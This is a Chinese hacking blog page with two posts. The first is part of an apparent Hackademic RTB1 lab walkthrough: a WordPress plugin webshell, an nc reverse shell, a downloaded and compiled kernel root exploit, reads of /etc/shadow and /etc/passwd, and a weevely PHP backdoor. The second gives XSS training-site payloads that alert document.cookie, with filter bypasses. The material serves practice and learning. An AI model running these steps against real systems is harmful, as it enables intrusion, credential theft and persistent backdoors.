<p>登陆wordpress的后台wp-admin</p>
<p>尝试上传php webshell到服务器，以方便运行一些linux命令.在插件页面寻找任何可以编辑的插件. 我们选择Textile这款插件，编辑插入我们的php webshell，点击更新文件，然后访问我们的php webshell.<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034116vAU.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034116vAU.png" alt="上传漏洞获得webshell" title="28"></a></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0341256aB.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/0341256aB.png" alt="上传漏洞获得webshell" title="29"></a></p>
<p>Php webshell被解析了，我们可以控制你网站的文件，但是我们只希望获得网站服务器的root权限,来入侵服务器上其它的网站。</p>
<p>我们用NC来反弹一个shell,首先在我们的电脑上监听5555端口.</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034130Xjn.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034130Xjn.png" alt="NC反弹" title="32"></a></p>
<p>然后在Php webshell上反向连接我们的电脑，输入你的IP和端口5555.<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034145p83.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034145p83.png" alt="NC反弹" title="31"></a></p>
<p>点击连接我们会看到<br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034153nRQ.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034153nRQ.png" alt="NC反弹" title="33"></a></p>
<p>&nbsp;</p>
<p>接下来我们尝试执行一些命令：</p>
<p>id</p>
<p>uid=48(apache) gid=489(apache) groups=489(apache)<br>（用来显示用户的id和组）</p>
<p>pwd</p>
<p>/var/www/html/Hackademic_RTB1/wp-content/plugins<br>（显示服务器上当前的路径）</p>
<p>uname -a</p>
<p>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux<br>（显示内核版本信息）</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034220jQo.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034220jQo.png" alt="Linux基础命令" title="34"></a></p>
<p>现在我们知道，服务器的内核版本是2.6.31.5-127.fc12.1686,我们在exploit-db.com中搜索此版本的相关漏洞.<br>在服务器上测试了很多exp之后，我们用以下的exp来提升权限.<br><a href="http://www.exploit-db.com/exploits/15285" target="_blank" rel="external">http://www.exploit-db.com/exploits/15285</a></p>
<p>我们在nc shell上执行以下命令:<br><strong>wget <a href="http://www.exploit-db.com/exploits/15285" target="_blank" rel="external">http://www.exploit-db.com/exploits/15285</a> -o roro.c</strong><br>(下载exp到服务器并重命名为roro.c)<br>注：很多linux内核的exp都是C语言开发的,因此我们保存为.c扩展名.<br>exp roro.c代码如下：</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#include &lt;unistd.h&gt;</p>
<p>#include &lt;stdlib.h&gt;</p>
<p>#include &lt;fcntl.h&gt;</p>
<p>#include &lt;sys/types.h&gt;</p>
<p>#include &lt;sys/socket.h&gt;</p>
<p>#include &lt;netinet/in.h&gt;</p>
<p>#include &lt;errno.h&gt;</p>
<p>#include &lt;string.h&gt;</p>
<p>#include &lt;sys/ptrace.h&gt;</p>
<p>#include &lt;sys/utsname.h&gt;</p>
<p>#define RECVPORT 5555</p>
<p>#define SENDPORT 6666<br>int prep_sock(int port)<br>{<br>int s, ret;<br>struct sockaddr_in addr;<br>s = socket(PF_RDS, SOCK_SEQPACKET, 0);<br>if(s &lt; 0)<br>{<br>printf(“[*] Could not open socket.n”);<br>exit(-1);<br>}<br>memset(&amp;addr, 0, sizeof(addr));<br>通过以上代码我们发现该exp是C语言开发的，我们需要将他编译成elf格式的,命令如下:</p>
<p><strong>gcc roro.c –o roro</strong></p>
<p>接下来执行编译好的exp</p>
<p><strong>./roro</strong></p>
<p>&nbsp;</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034231h2r.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034231h2r.jpg" alt="exp编译" title="36"></a><br>执行完成之后我们输入id命令</p>
<p>id</p>
<p>我们发现我们已经是root权限了</p>
<p>uid=0(root) gid=0(root)</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034235Hjp.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034235Hjp.png" alt="Linux服务器提权" title="37"></a><br>现在我们可以查看/etc/shadow文件<br><strong>cat /etc/shadow</strong><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034256AXA.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034256AXA.jpg" alt="linux基础命令" title="38"></a><br>查看/etc/passwd 文件</p>
<p><strong>cat /etc/passwd</strong><br><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034321dUi.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034321dUi.jpg" alt="linux基础命令" title="39"></a><br>我们可以使用”john the ripper”工具破解所有用户的密码.但是我们不会这样做，我们需要在这个服务器上留下后门以方便我们在任何时候访问它.</p>
<p>我们用weevely制作一个php小马上传到服务器上.</p>
<p>1.weevely使用选项<br><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034329JUB.jpg" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034329JUB.jpg" alt="weevely使用方法" title="40"></a></p>
<p>2.用weevely创建一个密码为koko的php后门</p>
<p><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -g -o hax.php -p koko</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034352PkW.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034352PkW.png" alt="weevely使用方法" title="41"></a></p>
<p>接下来上传到服务器之后来使用它<br><strong>root@bt:/pentest/backdoors/web/weevely# ./main.py -t -u <a href="http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php" target="_blank" rel="external">http://hack-test.com/Hackademic_RTB1/wp-content/plugins/hax.php</a> -p koko</strong></p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034402HWa.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034402HWa.png" alt="weevely使用方法" title="42"></a><br>测试我们的hax.php后门</p>
<p><a href="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034426dWE.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/auto_save_image/2013/02/034426dWE.png" alt="weevely使用方法" title="43"></a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
    <article id="post-386" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2013/02/16/386/" class="article-date">
  	<time datetime="2013-02-15T22:37:24.000Z" itemprop="datePublished">2013-02-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/02/16/386/">二哥XSS教学宝典学习</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="第一章">第一章</h2><p><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a></p>
<p>简单，自己也搞定</p>
<p><a href="http://xsst.sinaapp.com/example/1-1.php?page=%3Cimg%20src=%22http://www.baidu.com/img/baidu_sylogo1.gif%22%3E" target="_blank" rel="external">http://xsst.sinapp.com/example/1-1.php?page=&lt;img src=”http://www.baidu.com/img/baidu_sylogo1.gif”&gt;</a></p>
<h2 id="第二章">第二章</h2><p><a href="http://xsst.sinapp.com/example/1-2.php?page=2;alert(document.cookie" target="_blank" rel="external">http://xsst.sinapp.com/example/1-2.php?page=2;alert(document.cookie)</a>)</p>
<p>构造闭合，参数多了双引号，同样的修改一下，进行闭合。</p>
<p><a href="http://xsst.sinaapp.com/example/1-2.php?page=%22;alert(document.cookie" target="_blank" rel="external">http://xsst.sinapp.com/example/1-2.php?page=”;alert(document.cookie);//</a>;//)</p>
<p>&nbsp;</p>
<p>课后练习题：</p>
<p>第1个，由于过滤了双引号，所以通过编码绕过。</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2.php?page=1%27%2beval%28alert%28document.cookie%29%29%29;//" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2.php?page=1%27%2beval%28alert%28document.cookie%29%29%29;//</a></p>
<p>第2个的查看一下，我们可以构造如下闭合，</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2-2.php?page=1" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2-2.php?page=1’);alert(document.cookie);//</a><a href="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130216080657.png" target="_blank" rel="external"><img src="http://7xnueu.com1.z0.glb.clouddn.com/2013/02/QQ20130216080657.png" alt="QQ20130216080657"></a></p>
<p>第3个</p>
<p><a href="http://xsst.sinaapp.com/example/test1-2-3.php?page=1" target="_blank" rel="external">http://xsst.sinaapp.com/example/test1-2-3.php?page=1’;alalertert(document.cookie);’</a></p>
<h2 id="第三章">第三章</h2><p>html 静态网页传参了，以前都以为是伪静态，我去哦。js的获取地址栏参数以前自己还用过，完全没想到。菜鸟一个啊。</p>
<p><a href="http://xsst.sinaapp.com/example/1-3.htm?url=./iframe.htm" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3.htm?url=./iframe.htm</a></p>
<p>练习题：</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=1" target="_blank" rel="external">使用document.write造成的XSS （会被IE拦截,Chrome下参数中&lt;,&gt;被自动编码导致无效）</a></p>
<p>前面没注意 ie，chrome均不成功，别说这些了，火狐safari，opera均没弹窗</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=1&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=1&amp;url=’&gt;&lt;img src=’1’ onerror=’alert(document.cookie)’&gt;&lt;/img&gt;</a></p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:20,name:" target="_blank" rel="external">使用eval造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:0,name:(function(" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=2&amp;url={age:0,name:(function(){alert(document.cookie)})()}</a>{alert(document.cookie)})()})</p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=3" target="_blank" rel="external">使用innerHTML造成的XSS （会被IE拦截,Chrome下参数中&lt;,&gt;被自动编码导致无效）</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=3&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=3&amp;url=’&gt;&lt;img src=’1’ onerror=’alert(document.cookie)’&gt;&lt;/img&gt;</a></p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=4" target="_blank" rel="external">使用location/location.href/location.replace/iframe.src造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=4&amp;url=javascript:alert(document.cookie" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=4&amp;url=javascript:alert(document.cookie);</a>;)</p>
<p>&nbsp;</p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=www.baidu.com" target="_blank" rel="external">使用setTimeout/setInterval造成的XSS</a></p>
<p><a href="http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-3-2.php?bug=5&amp;url=’);alert(document.cookie);eval(‘</a></p>
<p>&nbsp;</p>
<p>wooyun上dom xss</p>
<p><a href="http://www.wooyun.org/tags/dom%E7%B1%BB%E5%9E%8Bxss" target="_blank" rel="external">http://www.wooyun.org/tags/dom%E7%B1%BB%E5%9E%8Bxss</a></p>
<p>最后可以看这里的，比较新哦html5安全相关。</p>
<p><a href="http://html5sec.org/" target="_blank" rel="external">http://html5sec.org/</a></p>
<p>&nbsp;</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hack/">hack</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/Hack/">Hack</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  

  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">

            
    	<div class="footer-left">
    		&copy; 2016 双人份
    	</div>
    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    	本站总访问量<span id="busuanzi_value_site_pv"></span>次

      <div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      </div>
    </div>
  </div>
</footer>
    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: false,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="/js/main.js" type="text/javascript"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>